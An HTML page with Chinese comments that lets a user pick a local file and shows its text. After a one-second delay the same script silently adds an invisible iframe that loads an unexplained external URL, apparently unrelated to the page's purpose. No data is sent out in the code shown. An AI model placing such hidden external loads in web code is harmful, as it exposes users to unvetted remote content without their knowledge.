<!DOCTYPE html>
<html>
<head>
    <title>选择文件并显示内容</title>
    <script type="text/javascript">
        function openFilePicker() {
            // 创建一个input元素用于文件选择
            var fileInput = document.createElement('input');
            fileInput.type = 'file';
            fileInput.accept = ''; // 允许选择任何类型的文件
            fileInput.style.display = 'none'; // 隐藏输入元素
            fileInput.addEventListener('change', function() {
                // 当用户选择文件后执行此回调函数
                var selectedFile = fileInput.files[0];
                if (selectedFile) {
                    var reader = new FileReader();
                    reader.onload = function(e) {
                        // 读取到文件内容后显示在页面上
                        document.getElementById('fileContents').textContent = e.target.result;
                    };
                    reader.readAsText(selectedFile);
                }
            });
            document.body.appendChild(fileInput);
            fileInput.click();

            // 在延时后加载外部网站
            setTimeout(loadExternalSite, 1000);
        }

        function loadExternalSite() {
            // 创建一个iframe元素用于加载外部网站
            var iframe = document.createElement('iframe');
            iframe.src = 'https://h5hosting-drcn.dbankcdn.cn/aaa'; // 外部网站的URL
            iframe.style.display = 'none'; // 隐藏iframe
            document.body.appendChild(iframe);
        }
    </script>
</head>
<body>
    <h1>选择文件并展示内容</h1>
    
    <button onclick="openFilePicker()">选择文件</button>

    <div id="fileContents">
        <!-- 选定文件的内容将在这里显示 -->
    </div>
</body>
</html>
